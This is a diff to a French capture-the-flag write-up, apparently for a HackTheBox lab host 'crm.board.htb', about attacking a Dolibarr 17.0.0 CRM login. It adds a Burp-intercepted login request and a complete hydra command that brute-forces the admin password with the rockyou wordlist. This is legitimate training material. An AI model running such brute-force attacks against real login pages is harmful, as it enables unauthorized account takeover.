@@ -200,9 +200,30 @@ On obtient le résultat suivant:
 
 On a donc trouvé l'hôte `crm.board.htb`.
 Lorsqu'on accède à la page, on voit qu'il s'agit d'une page de login pour le CRM `Dolibarr 17.0.0`
-En regardant sur `exploit-db.com` on trouve que la version `17.0.1` est vulnérable à une attaque XSS.
+En regardant sur `exploit-db.com` on trouve que la version `17.0.1` est vulnérable à une attaque XSS. Peut-être utile pour plus tard.
 
-Avec ces informations en main, on va tenter une attaque sur le login avec hydra:
+Avec ces informations en tête, on va tenter une attaque sur le login avec hydra.
+Pour procéder, on va avoir besoin d'un example de requête de login. Nous allons donc l'intercepter avec burp.
+```bash
+POST /index.php?mainmenu=home HTTP/1.1
+Host: crm.board.htb
+Content-Length: 378
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://crm.board.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://crm.board.htb/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=56oa8fv9t9ajjnulagksl2q5u8
+Connection: close
+
+token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-3T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=test
+```
+
+Une fois ces informations en main, on lance hydra:
 ```bash
 sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 16 http-post-form://crm.board.htb/index.php?mainmenu=home:"token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-03T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=^USER^&password=^PASS^:F=incorrect" -o hydra_results.txt
 ```
